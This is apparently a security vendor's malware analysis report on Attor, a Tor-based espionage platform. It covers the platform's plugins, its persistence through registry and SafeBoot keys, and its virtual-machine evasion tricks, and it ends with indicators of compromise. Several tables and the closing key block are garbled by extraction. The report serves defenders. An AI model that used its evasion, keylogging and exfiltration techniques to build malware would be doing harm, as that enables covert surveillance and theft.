folderPluginsUpdatesResourcesCollecteddata and logsLoaded by the main modulewith each executionExecuted and deleted by the main moduleMiscellaneous \ufb01lesFigure 3 // Attor\u2019s architecture . Note that ID 0x06 represents a single plugin,but the functionality is split here into two parts for clarity .53.1 Persistence The Installer/watchdog plugin is responsible for ensuring Attor\u2019s persistence, by scheduling a task that loads the dispatcher .In some versions of the malware, the dispatcher itself is responsible for this functionality, using one of two mechanisms depending on the privileges with which the malware was initially executed . Regardless of the persistence method, one of Attor\u2019s threads monitors whether it is still installed on the system, and reinstalls it if not .The first technique used by the dispatcher is to create a logon script that loads the dispatcher DLL (using rundll32.exe) at each user logon . To achieve this, malware sets the UserInitMprLogonScript value under the HKEY_CURRENT_USER\\Environment registry key .If running in a privileged context, it registers the dispatcher as a service, and installs it to be executed on each system start by adding the service name to the netsvcs group .Notably, Attor also instructs the service to be executed in Safe Mode and Safe Mode with Networking . This is achieved by creating a subkey for the malicious service under the SafeBoot registry keys:\u2022 HKEY_LOCAL_MACHINE\\SYSTEM\\*ControlSet*\\Control\\SafeBoot\\Minimal \u2022 HKEY_LOCAL_MACHINE\\SYSTEM\\*ControlSet*\\Control\\SafeBoot\\NetworkAttor then sets the default value of these subkeys to Service, to indicate the malicious service should be loaded during a safe mode boot .Note: In the provided registry keys, *ControlSet* represents all registry subkeys with the \u201cControlSet\u201d substring in their names, e.g. ControlSet001 or CurrentControlSet.3.2 Collection and exfiltration Several plugins provide espionage capabilities; we refer to them as the Device monitor, Screengrabber, Audio recorder and Key/clipboard logger plugins . These plugins store the collected data and log files in a central Upload folder .These plugins do not communicate with the C&C server themselves . Instead, it is the File uploader plugin that automatically uploads these files to the C&C server .The main module monitors if there is enough space on the disk where the Upload folder is located \u2013 if not, the plugins do not proceed with creating additional files, in order to avoid suspicion by the user .3.3 Network communication There are only two Attor components that communicate with the C&C server: the aforementioned File uploader, and the Command dispatcher that downloads commands and additional tools from the C&C server .Both plugins use FTP; files are uploaded to/downloaded from an FTP server that is protected by credentials hardcoded in the configuration . Passive FTP mode is used, where the client initiates both connections to the server .The malware uses the Tor: Onion Service Protocol, with the C&C server having a .onion address, so the communication must be enabled by a Tor client plugin and relayed using a SOCKS proxy plugin . In order to communicate with the C&C server, any plugin must first establish a connection with the Tor client (listening on the non-default localhost:8045) which is responsible for resolving the onion domain, choosing a circuit and encrypting data in layers .6The Tor client plugin must communicate with the dispatcher, which implements the cryptographic functions . Furthermore, it communicates with the SOCKS proxy (listening on localhost:5153) that relays the communication between the Tor client and the remote server .In total, the infrastructure for C&C communication spans four Attor components \u2013 the dispatcher providing encryption functions, and three plugins implementing the FTP protocol, the Tor functionality and the actual network communication . This mechanism is illustrated in Figure 4 .FTPID 0x06 commandsID 0x05 File uploaderUsesfunctionsID 0x06Command dispatcherUsesfunctionsUsesfunctionsID 0x00 DispatcherProxy for Windows APIand cryptographic functionsFigure 4 // Four Attor components cooperate to enable communication with the C&C server74 TECHNICAL ANALYSIS In this section, we will provide technical details about the respective Attor components .4.1 Dispatcher The dispatcher, which is a dynamic-link library, is a central unit of the platform . Its name usually starts with letters \u201cSR\u201d, followed by some random letters . Dispatcher names we have seen include SRnhm.dll, SRSfxu.dll, SRzsp.dll, SRhhz.dll, SRanx.dll and sRWobwa.dll . For 64-bit versions, the \u201cx64\u201d suffix is added to the name, e .g ., SRzspx64.dll .The dispatcher contains encrypted configuration data with:\u2022 Paths to working folders (Upload folder, Plugin folder, Update folder, Resource folder) \u2022 FTP server domain and credentials (for C&C and exfiltration) \u2022 RSA public key \u2022 Name of the service under which the malware should be installedOther components retrieve the configuration data from the dispatcher via a designated interface .The dispatcher injects itself into all processes (except some system processes and some processes belonging to Symantec products) . Subsequently, it loads all plugins from the Plugin folder (location of which is determined by the configuration) .The plugins then use functions implemented by the dispatcher, a reference to which is passed to the plugins on load .There are both 32-bit and 64-bit versions of the main Attor dispatcher DLL . On 64-bit systems, both are loaded, which ensures the malware can inject itself into both 32-bit and 64-bit processes and monitor them (e .g ., by taking screenshots and collecting keystrokes) .4.1.1 Encryption methods Strings in the malware components are protected by an XOR cipher with a hardcoded key2 .The configuration data (which is embedded in the main module), as well as the backdoor commands, are protected by a hybrid encryption scheme, where data is encrypted symmetrically using Blowfish and prepended with an RSA-encrypted Blowfish key .The Blowfish cipher is used in OFB mode, with a 16-byte key randomly generated for each message . The public RSA key2 used for encrypting the Blowfish key is embedded in the main module .Encryption and decryption methods are implemented by the main module, but are also used by the loadable plugins via the interface provided by the main module (see Section 4 .1 .3) . Attor\u2019s plugins use the same encryption scheme for encrypting the collected data .4.1.2 Evasion techniques Attor has implemented measures to detect whether it is being executed in an analytical environment . It terminates itself if an emulator or virtual machine is detected .To detect (some) emulators, Attor performs two similar tests:\u2022 It creates a randomly-named event, and then queries the event name via the NtQueryObject APIfunction .\u2022 It opens the HKEY_LOCAL_MACHINE\\SYSTEM registry key and then queries its name by passing the keyhandle to the same API function .2 See the IoCs section for the extracted keys8If there is a mismatch in the names in any of these cases, Attor assumes the presence of an emulator and exits .To detect virtual machines, Attor utilizes the following methods for detecting VMware, VirtualBox and Virtual PC:\u2022 It calls the sldt instruction, which stores the address of the Local Descriptor Table in a register; theaddress should be zero on native systems and non-zero in VMware . This is illustrated in Figure 5a .\u2022 It executes an undefined instruction vpcext that is valid in Virtual PC and VirtualBox environments,but will generate an exception if executed in a native environment . This is illustrated in Figure 5b .\u2022 It attempts to retrieve the VMware version by communicating with I/O ports, using the ininstruction . If called in a VMware environment with the parameters seen in Figure 5c, the magic value VMXh is returned as the result .\u2022 It tries to read from the \\\\.\\VBoxMiniRdrDN pseudo-device, to discover whether it is running inVirtualBox . This is illustrated in Figure 5d .Figure 5 // Attor employs several techniques to detect specific virtual environmentsFurthermore, Attor uses other techniques to avoid detection:\u2022 Network communication plugins are injected into applications such as web browsers or IMapplications, in order to blend in with legitimate network traffic .\u2022 To prevent suspicion, whenever Attor manipulates a file or a registry key, it then restores the originalvalues of their last access time .\u2022 All files created by Attor have the hidden, system and archive attributes set in order to be hidden fromWindows Explorer by default .94.1.3 Interface for plugins Attor\u2019s plugins use functions implemented by the main module, which makes them harder to detect and analyze, because they call functions of the dispatcher instead of Windows API functions .The functions are called using the function dispatcher, which takes as its arguments the function type and its numerical identifier . Figure 6 illustrates a part of one plugin, calling the function dispatcher on several occasions . In the disassembly on the right, we replaced the numeric identifiers with descriptive names, that we recovered by reverse-engineering the dispatcher .A reference to the function dispatcher is passed to the plugin on load . Since the plugins are loaded into the same process as the dispatcher, they share the same address space, and thus the plugins can call the functions of the dispatcher DLL directly . This design makes it harder to analyze individual components of Attor without access to the dispatcher, which translates the specified identifier to a meaningful function that is then executed .Figure 6 // Additional plugins use functions implemented in the main module,by calling the function dispatcher (dubbed helperFnc here)10According to our analysis, the dispatcher implements three to four dozen functions, depending on the dispatcher version (new functions are included in the newer samples) . Table 1 lists functions recovered across all samples examined .Table 1 // The interface provided by the dispatcher DLLsFunction typeFunction IDFunctionality1 (resource manipulation functions)2 (cryptographic the Blowfish-encrypted dataGenerate an RSA keyHash data (SHA-1 or MD5)Hash data \u2013 init part (SHA-1 or MD5)Overwrite a memory block with null bytesHash data \u2013 update part (SHA-1 or MD5)Hash data \u2013 final part (SHA-1 or MD5)Hybrid encryption \u2013 generate a Blowfish key, encrypt it with RSA and then encrypt the data with Blowfish in OFB mode11Function typeFunction IDFunctionality3 (retrieving configuration data and global variables)1234567891011121314Get path to the Upload folder (from the config)Get path to the Update folder (from the config)Get path to the Plugin folder (from the config)Get path to the Resource folder (from the config)Get 16 hardcoded bytesGet attributes of ntdll .dll file (to be used for forging file timestamps)Change file timestamps to those of ntdll .dll fileCheck if there is enough space on diskGet FTP directory name (from the config)Get user ID (from the config)Get structure with global variables and configuration dataGet user security descriptorGet the specified config fieldResolve import4.2 Shared resources Instrumental for synchronization between the main module and plugins is a set of four central folders, where various resources are stored .The precise locations are hardcoded in Attor\u2019s configuration; most often we have seen the patterns in Table 2 used for naming these folders (x represents a variable lower-case letter) .Table 2 // Naming convention for the foldersFolder typeNaming patternPlugin folderUpdate folder%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\sxx%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vxxResource folder%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kxxUpload folder%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dxx4.2.1 Plugin folder, Update folder All plugins are permanently stored \u2013 compressed and encrypted \u2013 in the Plugin folder . The dispatcher loads plugins from this folder on each execution .The Update folder serves as a temporary store for additional files the attacker wants to execute on the compromised machine . The files get pushed to this folder via the Command dispatcher plugin; once the dispatcher recognizes a DLL in the Update folder, it loads it automatically, and deletes it afterwards . According to the artifacts in the dispatcher, the thread responsible for this functionality is called Update_th; thus, we believe this mechanism most likely is used for updating Attor\u2019s components .124.2.2 Upload folder The Upload folder is used, by the plugins tasked with collection, as a central folder to store collected data, and by other plugins to store log files .The File uploader plugin automatically uploads these files to the C&C server . Each file contains control data including plugin ID, file creation timestamp and a control flag 3ff3 and is encrypted using Blowfish-OFB combined with RSA . The hidden, system and archive attributes of the log files are set; the last access time is faked .RSA encryptionRandom 16(cid:22)byte Blow\ufb01sh keyBlow\ufb01sh(cid:12)OFB encryptionTimestamp\u201c3(cid:5)3\u201d \ufb02agPlugin IDDataFigure 7 // Hybrid encryption scheme used by AttorAdditionally, index files are used to keep track of log files \u2013 they store the number of log files of a certain group, and the counter values are then used to name the log files .Plugins usually store data in subdirectories of the Upload folder named by the plugin ID .Filenames are derived from user names, collected data (such as clipboard contents or device information), timestamp or counter value, and are mostly hexadecimal values .13Table 3 // The properties of the files in the Upload folderFilename patternPlugin IDFile content1.<device-hash>\\nm\\index.dat1.<device-hash>\\<counter><data-hash>1.<device-hash>\\<counter><data-hash><data-hash>1.<com-device-hash>\\nm\\index.dat1.<com-device-hash>\\<counter><data-hash>2.<user-name-hash>\\nm\\index.dat2.<user-name-hash>\\<counter><data-hash>7\\nm\\info7\\nm\\index.dat7\\<counter><data-hash>nm\\0_skp_<user-name>\\index.dat0_skp_<variable-data>111112277733Index file for storage device metadataStorage device information (bus type, device type, total disk size, TrueCrypt version . . .)Information about documents stored on the device (name, size, creation & last modified time)Index file for COM device metadataCOM device information (information about the phone/ modem, information about the subscriber)Index file for screenshotsScreenshot fileHash of last-stored clipboard dataIndex file for keylog/clipboard filesKeylog/clipboard dataIndex file for audio recordingsAudio recording fileNote: We only analyzed the older version of the plugin with ID 0x03. The file paths may be slightly different in the newer version, i.e., the one with the modern architecture.4.2.3 Resource folder This folder is used by all plugins to store miscellaneous resources that are not to be exfiltrated to the C&C server, such as scripts, timestamps or temporary files .4.3 Plugins Attor\u2019s architecture allows customization for individual targets, where the functionality of the platform relies heavily on plugins deployed on the compromised machine .The plugins are implemented as DLLs, loaded by the dispatcher . They are stored on the disk in a compressed and encrypted form, with the valid form of the DLL only being recovered in memory, when the dispatcher loads the plugin . This probably is an attempt to thwart detection, as the plugin DLLs are never present unencrypted on disk .All plugins export the same set of functions: DllCanUnloadNow, DllGetClassObject, DllRegisterServer, DllUnregisterServer, DllEntryPoint . When the dispatcher loads a plugin (DllEntryPoint), a start event is created, and several threads with the payload are started, which all wait until the event is signaled .14Figure 8 // DllGetClassObject export of a plugin that is responsible for initialization and starting the actual payloadThe plugins are activated by the main DLL calling the DllGetClassObject export (see Figure 8) with the following actions happening:\u2022 The main DLL passes a reference to the helper function of the dispatcher, which the plugin will use forretrieving configuration data, for file manipulation, for encryption/decryption\u2026\u2022 The start event is signaled, which activates the threads \u2022 The plugin returns the plugin ID and version, so that the main DLL can keep track of the activemodulesThe version information of plugins recovered in the course of our investigation, along with the plugins\u2019 functionality, is listed in Table 4 .15Table 4 // The analyzed plugins and their versionsPlugin IDAnalyzed versions0x0E(no version), 0x0C0x010x020x030x050x060x070x0D0x10FunctionalityDevice monitorScreengrabber(no version), 0x08, 0x09, 0x0B, 0x0CAudio recorder0x0A0x0AFile uploaderCommand dispatcher/SOCKS proxy0x02, 0x04, 0x09, 0x0AKey/clipboard logger0x030x01Tor clientInstaller/watchdogNote that if the numbering is continuous (which it might be, since 0x10 is the last we have seen and is only version 1, while e .g ., 0x03 is now on version 0x0C), there may be additional plugins available that we haven\u2019t seen .We only can guess what functionality those plugins unknown to us might have . If we are to speculate, we feel that missing is a remote shell functionality, and also functionality to exfiltrate specific files silently; there may also be more victim-specific plugins available .4.3.1 Device monitor (ID 0x01) The most curious plugin in Attor\u2019s arsenal collects information about connected modem/phone devices and connected storage drives, and about files present on these drives . It is responsible for collection of metadata, not the files themselves, so we consider it a plugin used for device fingerprinting, used as a base for further data theft .The Device monitor plugin creates a new window and uses SHChangeNotifyRegister API to register Shell-level notifications for that window on storage media insertion/removal, with a custom window message 0x421 . The window procedure handles these events, and WM_DEVICECHANGE message, and collects a specific set of information for either a modem or a phone device, or an external storage drive . 1. External storage drive In case a hard disk device is inserted, Device monitor collects the following information:\u2022 Bus type, device type, device type modifier, vendor ID, product ID, product revision string, serialnumber, device interfaces\u2022 Free space on disk, total disk size, filesystem used \u2022 If applicable, also TrueCrypt versionThe TrueCrypt version is determined by sending IOCTLs to the TrueCrypt driver (0x222004 (TC_IOCTL_GET_DRIVER_VERSION) and 0x72018 (TC_IOCTL_LEGACY_GET_DRIVER_VERSION)) . As these are TrueCrypt-specific control codes, not standard codes, the authors of the malware must have been familiar with the code of the TrueCrypt driver, or TrueCrypt installer . This technique is very rare .16Figure 9 // Device monitor plugin sends non-standard, TrueCrypt-specific control codes to the TrueCrypt driver,in order to determine the TrueCrypt versionFurther, it scans these hard disk devices for specific files and collects information about these files . It collects metadata such as filename, file size, creation and last-modified time of documents having the target extensions: .xls, .xlsx, .xlsm, .doc, .docx, .docm, .ppt, and .pptx .The information gathered by this plugin is stored in separate log files in the Upload folder, in order to be exfiltrated by another plugin .2. GSM/GPRS modem/phone device The more unusual functionality of this plugin is the ability to fingerprint GSM devices . Whenever a modem or a phone device is connected to the COM port, Device monitor uses AT commands to communicate with the device, via the associated serial port .AT commands, also known as Hayes command set, were originally developed in the 1980s to command a modem to dial, hang up or change connection settings . The command set was subsequently extended to support additional functionality, both standardized and vendor-specific .17In a recent paper, it was discovered that the commands are still in use in most modern smartphones . The researchers were able to bypass security mechanisms and communicate with the smartphones using AT commands through their USB interface . Thousands of commands were recovered and tested, including those to send SMS messages, push touch events, or leak sensitive information .This research illustrates that the old-school AT commands pose a serious risk when misused .As for Attor\u2019s plugin, however, we may only speculate why AT commands are employed . We have detected a 64-bit version of this plugin in 2019, and we can confirm it is still a part of the modernized Attor platform (that we first saw in 2018) . On the other hand, it seems unlikely it is targeting modern smartphone devices . The plugin ignores devices connected via a USB port, and only contacts those connected via a serial port (more precisely, devices with \u201cCOM*\u201d in the friendly name) .A more likely explanation of the plugin\u2019s main motive is that it targets modems and older phones . Alternatively, it may be used to communicate with some specific devices (used by the victim or target organization) that are connected to the COM port or to the USB port using a USB-to-serial adaptor . In this scenario, it is possible the attackers have learned about the victim\u2019s use of these devices using some other reconnaissance techniques .In any case, the plugin retrieves the following information from the connected devices, using the AT commands listed in Table 5:\u2022 Basic information about the mobile phone or GSM/GPRS modem: name of manufacturer, modelnumber, IMEI number and software version\u2022 Basic information about the subscriber: MSISDN and IMSI numberTable 5 // The commands of the AT protocol used by the Device monitor pluginAT commandFunctionalityATSignals start of communication (AT for attention) .AT+MODE=2Prepares the phone for an extended AT+ command set .AT+CGSNRequests IMEI number (International Mobile Equipment Identity), which is a unique number to identify a device .AT+CGMMRequests information about the model of the device (model number) .AT+CGMIAT+CGMRAT+CNUMAT+CIMIRequests name of the device manufacturer .Requests the version of the software loaded on the device .Requests MSISDN (Mobile Station International Subscriber Directory Number), which is the mapping of the telephone number to the subscriber identity module in a mobile or cellular phone .Requests IMSI (International Mobile Subscriber Identity), which is a unique number identifying a GSM subscriber . This number has two parts . The initial part is comprised of six digits in the North American standard and five digits in the European standard . It identifies the GSM network operator in a specific country with whom the subscriber holds an account . The second part is allocated by the network operator to uniquely identify the subscriber .Note that many more (vendor-specific) AT commands exist that are not used by this plugin . It is possible that malware operators use the listed commands to fingerprint the connected devices, and then deploy another plugin with more-specific commands to extract information from the device .184.3.2 Screengrabber (ID 0x02) This plugin captures screenshots of targeted applications and stores them encrypted in the Upload folder . It is only activated in applications of the attackers\u2019 choice, determined by the process name .After activation, the Screengrabber monitors the application\u2019s foreground window and if it is a web browser with a specific window title, or if it is another from the list of target applications, captures a screenshot every 10 seconds . For example, the plugin takes a screenshot if the victim is using an email client or has opened an email attachment .Targeted are mostly web browsers, including all major (Firefox, Opera, Chrome, Safari, Internet Explorer) and a few less popular (Maxthon, Avant, SeaMonkey) ones . By checking the window title of the web browser, the malware can determine whether the user is visiting a website of interest .We have encountered process names and window titles referring to these services:\u2022 Social networks and blogging platforms (Facebook, Twitter, Google+, Blogger, Livejournal) \u2022 Email services (Gmail, AOL Mail, Hotmail, Hotbox, Webmail, Yahoo! Mail) \u2022 Office software (MS Word, Powerpoint, Excel, Visio, Notepad, Notepad++, Wordpad) \u2022 Archiving utilities (WinRAR, WinZip, Hamster) \u2022 Cloud storage and file sharing services (Turbobit, Skydrive, RapidShare) \u2022 Messaging, VoIP applications and web-based messaging services (Skype, Viber, Miranda, Pidgin, QIP,qutIM)Apart from these widely used applications, the list contains a number of irregularities, which can give us more insight about the intended victims .For example, having TrueCrypt on the list suggests that the attackers are specifically interested in privacy-conscious users . Also targeted are encryption/digital signature utilities, a VPN application (HMA VPN), secure mail clients (The Bat! and HushMail) and a secure web browser (Dragon) .Furthermore, the applications on the list show the attackers are targeting Russian-speaking users \u2013 which is also confirmed by the geographical distribution of Attor, as explained in Section 2 . The strings from the list of services targeted by the Screengrabber, that support this claim, are documented in Table 6 .Table 6 // Artifacts from Attor\u2019s Screengrabber associated with Russian applicationsProcess name/window title substringContext\u041e\u0414\u041d\u041e\u041a\u041b\u0410\u0421\u0421\u041d\u0418\u041a\u0418 (transl . Classmates)Russian social network (Odnoklassniki)AGENTVKONTAKTEWEBMONEYRussian social network (VKontakte)Online payment system used in Russia (WebMoney)MAIL .YANDEX, \u042f\u041d\u0414\u0415\u041a\u0421 .\u041f\u041e\u0427\u0422\u0410 (transl . Yandex .Mail), MAIL .RU, POCHTA (transl . Mail), MAGENTRussian email services (Mail.ru, Yandex.Mail)\u041f\u0420\u0418\u0413\u041b\u0410\u0428\u0415\u041d\u0418\u0415 \u0414\u0420\u0423\u0416\u0418\u0422\u042c (transl . Friend request)Russian text\u0412\u0410\u041c \u0421\u041e\u041e\u0411\u0429\u0415\u041d\u0418\u0415 (transl . Message for you)Russian textMULTIFONQIP, INFIUMRAMBLERRussian VoIP serviceRussian IM application (QIP)Russian search engine (Rambler)19Interestingly, the list of targeted applications contains some services that are now defunct or less popular than 10 years ago, which may suggest that the Attor platform is much older than we think .4.3.3 Audio recorder (ID 0x03) This plugin creates audio recordings using available microphones and stores them encrypted in the Upload folder .The plugin is only activated if executed within a process of a teleconferencing application, which is determined by comparing the process name against a hardcoded list that includes Skype, Facebook Video Calling, Brosix or Cheap VoIP .This may indicate the attackers are interested in eavesdropping on online calls .With this mechanism, the attackers can also record the victim\u2019s conversations outside of teleconferencing apps . In this case, running in a process of a teleconferencing application can be an attempt to stay undetected, as the user is less likely to become suspicious that these applications access the microphone device .4.3.4 File uploader (ID 0x05) The File uploader plugin is responsible for exfiltration of collected data and log files to the C&C server .The files are uploaded to the C&C server automatically, in batches . Files are uploaded in FTP passive mode, as binary content, and are deleted from the Upload folder after the exfiltration .The C&C server and credentials are hardcoded in the configuration data; these credentials were used in all the collected plugins:\u2022 C&C server: \u201cidayqh3zhj5j243t[ .]onion\u201d \u2022 username: \u201cdo\u201d \u2022 password: [Redacted]The plugin logs in to the FTP server and copies the contents of the upload directory to a directory on the FTP server hardcoded in the config, creating a subdirectory there, with the victim ID as its name .In order to reach out to the C&C server in the Tor network, the File uploader plugin uses other plugins (0x0D and 0x06) that provide the Tor and SOCKS proxy functionality (see Figure 4 . Network communication .)The File uploader plugin is only activated if running within the process of a web browser or an instant messaging application or other network applications (this is determined by checking the process name against a hardcoded list) . This trick hides the exfiltration-related network communication in a stream of legitimate communication made by that application, and thus reduces the risk of raising any suspicion .4.3.5 Command dispatcher/SOCKS proxy (ID 0x06) This plugin serves two purposes .First, it serves as a SOCKS proxy, used by the Tor client plugin (ID 0x0D) to communicate with the remote computer .Second, it downloads commands from the C&C server and interprets them .Just as with other plugins involved in C&C communication, Command dispatcher also hides its network communication using the trick described in Section 4 .3 .4 .The Command dispatcher plugin communicates with the C&C server via the FTP protocol using the 0x0D plugin (with Tor); the credentials are the same as those used by the File uploader plugin for exfiltration .20After the communication is established, Command dispatcher downloads a file called WAND.bin from the server, decrypts it (RSA + Blowfish) and parses the commands using the CommandLineToArgW API function .The plugin supports four commands, as listed in Table 7 .Table 7 // Commands supported by Attor\u2019s Command dispatcher pluginCommand nameFunctionalitySETMOVEDELETECOPYSet the value of an internal variableRename a local fileDelete a local fileDownload a file from the FTP server to the specified locationOf interest is the COPY command serves as a mechanism for the malware to download additional resources, namely:\u2022 New plugins that will be stored in the Plugin folder and loaded by the main module on its nextexecution\u2022 Updates that will be stored in the Updates folder and immediately loaded and then deleted by thedispatcher\u2022 Miscellaneous files that will be stored in the Resource folder \u2022 New versions of the dispatcher, either 32-bit or 64-bitCommand dispatcher stores encrypted log data containing status/results of the executed commands in the Upload folder, and timestamp of the last time the C&C server was contacted, in the Resource folder .4.3.6 Key/clipboard logger (ID 0x07) This plugin steals clipboard data, and collects keystrokes pressed within the process in which the DLL is injected .Due to the fact the dispatcher injects itself into all running processes, and then loads additional plugins, this logger\u2019s DLL will be loaded into all processes as well .This plugin scans the content of the clipboard and whenever a change is detected, it stores the data in a log file . It is only concerned with user GUI desktop (\u201cWinSta0\u201d) and UNICODE format clipboard data (i .e ., not files, objects etc .) .For keylogging, this plugin installs a hook function to the window of the current process that has the keyboard focus . To avoid detection, it uses a less common technique: instead of hooking WH_KEYBOARD or WH_KEYBOARD_LL, it hooks WH_GETMESSAGE . Whenever the window receives WM_CHAR or WM_KEYDOWN message, the plugin translates the pressed keystrokes into text .The collected clipboard and keyboard data are stored in encrypted files in the Upload folder .4.3.7 Tor client (ID 0x0D) This plugin is based on the Tor client, customized to the design of this malware (tor.exe with added interaction with Attor\u2019s dispatcher) .It is responsible for computations, such as choosing a random circuit and providing multilayer encryption, and for establishing the communication with the Tor network by resolving the onion hostname .21For the actual network communication, it utilizes the SOCKS proxy implemented by plugin 0x06 .The attackers use Tor for C&C communication and exfiltration for anonymity and untraceability . Also, the Tor client plugin hides its network communication using the trick described in Section 4 .3 .4 .4.3.8 Installer/watchdog (ID 0x10) This plugin establishes and monitors persistence of the main module .It schedules a task that loads the main module with each system start or each user logon (depending on the process privileges) . It then continues to monitor whether the task is still scheduled; if not, the plugin will reschedule it .To run with necessary privileges, the Installer/watchdog plugin is only activated if injected into one of the following processes:\u2022 %system%\\* \u2022 %windir%\\explorer.exe \u2022 %windir%\\regedit.exe To make the task scheduling functionality stealthier, it doesn\u2019t utilize API calls; instead, it is implemented using the ITaskScheduler COM interface, registered using XML specification .5 CONCLUSION Attor is an espionage platform, used for highly targeted attacks, and has flown under the radar successfully since 2013 .Attor is professionally written malware with a loadable plugin architecture that can be used to customize the functionality to specific targets . It implements mechanisms for automated data collection and exfiltration, as well as for pushing additional plugins to the compromised machine .Its functionality includes an unusual plugin for GSM fingerprinting that utilizes a rarely used AT command set . Attor incorporates Tor with the aim of anonymity and untraceability, and scatters the network communication functionality among several components, to make analysis rather difficult .We were not able to recover the full operation timeline, nor the initial access vector . The versioning information in the plugins suggests there are other plugins that we have not yet seen . However, our research provides a deep insight into the malware, and suggests that it is well worth further tracking of the operations of the group behind this malware .6 INDICATORS OF COMPROMISE (IOCS)ESET detection names Win32/Attor Win64/AttorSHA-1 Note: We only present SHA-1 of older-version plugins, which used a simplified architecture and appeared unencrypted on disk.22Dropper idayqh3zhj5j243t[ .]onion23File-based indicatorsDispatcher filenames SRzspx64.dllPlugin folder paths %COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US-df %COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US-sf %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\sup %ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\svn %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\sgp %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\ssw %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\ssm %ALLUSERSPROFILE%\\Sun\\Java\\Java Update\\Caches\\s3xUpload folder paths %COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US-vv %COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US-nh %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dmx %ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\dtr %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dnf %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\dtl %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\deu %ALLUSERSPROFILE%\\Sun\\Java\\Java Update\\Caches\\d5lUpdate folder paths %COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US-fu %COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US-zn %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vhb %ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\vau %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vtt %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vzu24%ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\vwq %ALLUSERSPROFILE%\\Sun\\Java\\Java Update\\Caches\\v1e Resource folder paths %COMMONAPPDATA%\\Lenovo\\ImController\\shared\\US-ba %COMMONAPPDATA%\\Adobe\\Setup\\Replicate\\US-pq %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\knz %ALLUSERSPROFILE%\\Oracle\\Java\\.NetFX\\kcw %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kya %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kub %ALLUSERSPROFILE%\\Oracle\\Java\\.NET35\\kmm %ALLUSERSPROFILE%\\Sun\\Java\\Java Update\\Caches\\k7fSynchronization object names Note: xx represents a byte expressed in hexadecimal notation (a module ID or an object ID)Global\\{6A2B597F-1C2F-4f78-AC94-7E1C8F136B0F} Global\\{3B68B0E9-08C4-4f23-B84C-CD76CCC4D362} Global\\{E5C403BC-555E-4162-8F18-EFF27A6957C1} Global\\{DC006092-9E86-4c20-8601-F643AF574444} Global\\{C4AE71DA-D55C-4a41-9F86-9F97D3CD47D9} Global\\{7D715AC5-B909-4aaf-90C9-882CC4423F8C} Global\\{377142C5-B7BD-42da-A8B3-4CAD9DA53326} Global\\{343D67FA-567D-415e-9FAE-622153EFE241} Global\\{144DB9C5-A3B7-4eab-AD9A-0E80B3FF7853} Global\\{7BD3390E-05C1-43a0-B938-94F52C3F3D32} Global\\Root#SYSTEM#0000#{43850F15-CB8E-4a88-9BA0-F11FB0xxA2xx} {770F45C0-D879-4d4d-9F03-3AC9F2CA4ECB} {69DB17B0-4DA5-43b6-8A63-76B483AE7D5A} [HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A7F7DE86-C5BF-4239-A220-BF7523F5501E}] [HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A8F7DE86-C5BF-4239-A220-BF7523F5501E}] [HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A7E7DE86-C5BF-4239-A220-BF7523F5501E}] [HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{A8E7DE86-C5BF-4239-A220-BF7523F5501E}]Service display names Adobe Acrobat Update v3 .17 .lkws Adobe Acrobat Update Service v3 .2 .muitnl Microsoft .NET Framework NGEN v3 .5 .10549_X64_86 Microsoft .NET Framework NGEN v4 .0_X64_86 Microsoft .NET Framework NGEN v3 .5 .10549_X64_86 Microsoft .NET Framework NGEN v3 .5 .10549_X64_86 Microsoft .NET Framework NGEN v3 .5 .10549_X64_8625Cryptographic keysXOR cipher keys BEB05E4C303A65902E57A2C570465BD3993E5BCBB295BCF06AD167997A175247RSA public keys -----BEGIN PUBLIC KEY----- tF174pGFl7+ycxbCILAOZiHeCoEmk0463WJaLaNq27nQYSo4tCmdHy8DOH/ZYPwH cNM/8TsHFJjYsagVgrZXGdjdT78nxDDAORy5ey2Fb6tovVdT5oFGn3fJLcpyRzQK 0QL4/GeLis53IC8tlflGjnChT2R5rbecKk1d4b+AkhawwmOgsCsZJtgh+MpSyVAH -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+wyxqkGYGSrU6wbMz5y I2FfwmsFM8MbhU/73LSo/U0TYcecX7CGtT+yi+aG0Bddox4GKFebPYHqnOr0fVaB FxfjyDx359qgrtfbeGH4qUlVCheHWt890urb8m5SntqGN3m1PniK5u7Vvg8vvihw 20Z/FXUPjzvf99w45FeBSSj/FoOp7wHGA+HLArbpfRHHadj6MaxrCGqCXJZHFLYy -----END PUBLIC KEY----------BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArFYkoqZrdAm4zDI/hYT5 p2WfqOSzrD+bdr6VuZYYa1CInG1xciAwAZcDZi+wB8bFoCWIsVf7v6d6eTJ84DO8 